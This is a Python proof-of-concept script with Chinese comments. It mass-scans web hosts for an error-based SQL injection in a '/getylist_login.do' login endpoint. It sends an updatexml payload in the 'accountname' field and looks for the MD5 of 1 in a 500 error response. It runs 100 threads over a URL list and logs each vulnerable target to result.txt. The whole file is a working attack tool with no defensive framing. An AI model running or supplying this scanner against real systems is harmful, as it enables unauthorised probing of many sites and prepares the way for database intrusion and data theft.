import requests
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
# 主函数
def main():
    # 创建参数解析器
    parser = argparse.ArgumentParser(description='FVSSQL! ')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()
    # 处理命令行参数
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        # 从文件中读取URL列表
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        # 使用多线程处理URL列表
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
# 漏洞检测函数
def poc(target):
    url = target + '/getylist_login.do'
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Connection": "close",
        "Content-Length": "77",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    data = {
        'accountname': "test' and (updatexml(1,concat(0x7e,(select md5(1)),0x7e),1));--"
    }
    try:
        # 发送POST请求
        res1 = requests.post(url, headers=headers, data=data, verify=False, timeout=5)
        # 检查响应状态码和内容
        if res1.status_code == 500:
            if 'c4ca4238a0b923820dcc509a6f75849' in res1.text:
                print(f"[+] 该URL存在漏洞: {target}")
                # 将有漏洞的URL写入文件
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-] 该URL不存在漏洞: {target}")
    except Exception as e:
        print(f"[*] 该URL存在问题: {target} - {str(e)}")
if __name__ == '__main__':
    main()
